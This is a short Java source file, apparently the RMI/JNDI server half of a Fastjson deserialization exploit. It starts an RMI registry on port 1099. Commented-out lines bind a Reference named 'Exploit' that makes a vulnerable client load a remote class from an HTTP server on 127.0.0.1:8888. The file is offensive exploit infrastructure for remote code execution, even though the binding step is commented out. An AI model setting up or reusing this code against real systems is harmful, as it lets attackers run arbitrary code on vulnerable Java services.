package attack.fastjson.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import com.sun.rowset.JdbcRowSetImpl;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099);
//        Reference reference = new Reference("Exploit", "myclass.badClassName","http://127.0.0.1:8888/");
//        // python -m http.server 8888
//        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
//        registry.bind("Exploit",referenceWrapper);
    }
}